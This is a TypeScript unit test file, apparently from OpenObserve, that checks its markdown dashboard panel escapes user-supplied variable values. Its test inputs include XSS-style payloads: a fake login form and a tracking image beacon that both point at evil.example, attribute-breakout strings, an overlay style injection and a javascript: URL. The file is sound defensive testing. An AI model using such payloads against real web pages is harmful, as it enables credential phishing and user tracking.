// Copyright 2026 OpenObserve Inc.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

import { describe, expect, it } from "vitest";
import { renderMarkdownPanel } from "@/utils/dashboard/markdownPanel";

const FORM_PAYLOAD =
  '<form action="https://evil.example/x"><input type="password" name="p"><button>Login</button></form>';

const render = (content: string, value: unknown) => {
  const container = document.createElement("div");
  container.innerHTML = renderMarkdownPanel(content, {
    values: [{ name: "x", type: "textbox", value }],
  });
  return container;
};

describe("renderMarkdownPanel", () => {
  it("renders a URL-supplied form payload as text, not as a form", () => {
    const out = render("Hello ${x}", FORM_PAYLOAD);

    expect(out.querySelector("form")).toBeNull();
    expect(out.querySelector("input")).toBeNull();
    expect(out.textContent).toContain(FORM_PAYLOAD);
  });

  it("renders Markdown image and link syntax in a value as literal text", () => {
    const out = render(
      "Hello ${x}",
      "![x](https://evil.example/beacon) [login](https://evil.example)",
    );

    expect(out.querySelector("img")).toBeNull();
    expect(out.querySelector("a")).toBeNull();
    expect(out.textContent).toBe(
      "Hello ![x](https://evil.example/beacon) [login](https://evil.example)\n",
    );
  });

  it("keeps a value inside a raw HTML attribute from breaking out", () => {
    const out = render('<div title="${x}">t</div>', '"><img src=x>');

    expect(out.querySelector("img")).toBeNull();
    expect(out.querySelector("div")?.getAttribute("title")).toBe('"><img src=x>');
  });

  it("keeps a value inside an unquoted raw HTML attribute from adding attributes", () => {
    const out = render("<a href=${x}>t</a>", "https://evil.example style=position:fixed;inset:0");
    const link = out.querySelector("a");

    expect(link?.hasAttribute("style")).toBe(false);
    expect(link?.getAttribute("href")).toBe("https://evil.example style=position:fixed;inset:0");
  });

  it("shows values unchanged in text and code spans", () => {
    const out = render("Service `${x}` is ${x}", "api_gw-1.prod & co");

    expect(out.querySelector("code")?.textContent).toBe("api_gw-1.prod & co");
    expect(out.textContent).toBe("Service api_gw-1.prod & co is api_gw-1.prod & co\n");
  });

  it("still renders the panel's own Markdown around variables", () => {
    const out = render("# Region ${x}\n\n[open](https://example.com/?r=${x})", "us-east-1");

    expect(out.querySelector("h1")?.textContent).toBe("Region us-east-1");
    expect(out.querySelector("a")?.getAttribute("href")).toBe("https://example.com/?r=us-east-1");
  });

  it("joins multi-value variables with the requested format", () => {
    const out = render("${x:doublequote}", ["a", "b"]);

    expect(out.textContent).toBe('"a","b"\n');
  });

  it("inserts values verbatim in fenced code, before digits and with replacement patterns", () => {
    const out = render("```\n${x}\n```\n\n${x}5", "$&$1 <i>");

    expect(out.querySelector("pre code")?.textContent).toBe("$&$1 <i>\n");
    expect(out.querySelector("p")?.textContent).toBe("$&$1 <i>5");
    expect(out.querySelector("i")).toBeNull();
  });

  it("strips a javascript: URL supplied as a link target", () => {
    const out = render("[open](${x})", "javascript:alert(1)");

    expect(out.querySelector("a")?.getAttribute("href") ?? null).toBeNull();
  });

  it("drops style elements wherever they appear", () => {
    for (const md of [
      "<style>body{display:none}</style>\n\n# Hi",
      "# Hi\n\nsome text\n\n<style>body{display:none}</style>",
      "hello <style>body{display:none}</style>",
    ]) {
      const container = document.createElement("div");
      container.innerHTML = renderMarkdownPanel(md, {});

      expect(container.querySelector("style")).toBeNull();
    }
  });
});
